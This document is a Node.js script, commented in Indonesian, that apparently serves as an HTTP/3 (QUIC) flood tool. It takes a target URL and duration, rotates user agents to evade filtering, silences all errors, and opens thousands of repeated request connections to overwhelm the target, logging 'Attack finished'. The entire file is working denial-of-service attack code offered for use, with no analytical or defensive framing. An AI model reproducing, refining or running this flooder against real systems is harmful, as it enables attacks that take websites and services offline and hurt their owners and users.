const quic = require("node-quic");
const fs = require('fs');
const url = require('url');

if (process.argv.length <= 2) {
    console.log("Usage: node http3.js <url> <time>");
    process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = parsed.hostname;
const port = parsed.port || 443;
const path = parsed.path || '/';
const time = process.argv[3] * 1000;

// Load User-Agents dari ua.txt
let userAgents = [];
try {
    const data = fs.readFileSync('ua.txt', 'utf8');
    userAgents = data.split('\n').filter(ua => ua.trim() !== '');
} catch (err) {
    userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
    ];
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// Pool untuk mengelola koneksi
const connectionPool = [];
const MAX_POOL_SIZE = 1000;

function createConnection() {
    const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
    
    const requestData = JSON.stringify({
        method: 'GET',
        path: path,
        headers: {
            'User-Agent': ua,
            'Accept': '*/*',
            'Host': host
        }
    });

    quic.send(port, host, requestData)
        .then(() => {
            // Request berhasil, buat koneksi baru
            if (connectionPool.length < MAX_POOL_SIZE) {
                createConnection();
            }
        })
        .catch(() => {
            // Request gagal, buat koneksi baru
            if (connectionPool.length < MAX_POOL_SIZE) {
                createConnection();
            }
        });
}

// Flood function yang lebih agresif
function startFlood() {
    console.log(`Starting HTTP/3 flood to ${host} for ${time/1000} seconds`);
    
    // Buat banyak koneksi sekaligus
    for (let i = 0; i < 800; i++) {
        setTimeout(() => {
            for (let j = 0; j < 5; j++) {
                createConnection();
            }
        }, i * 2);
    }
    
    // Maintain pool size
    setInterval(() => {
        const needed = MAX_POOL_SIZE - connectionPool.length;
        if (needed > 0) {
            for (let i = 0; i < needed; i++) {
                createConnection();
            }
        }
    }, 100);
}

// Start attack
startFlood();

// Stop after specified time
setTimeout(() => {
    console.log('Attack finished');
    process.exit(0);
}, time);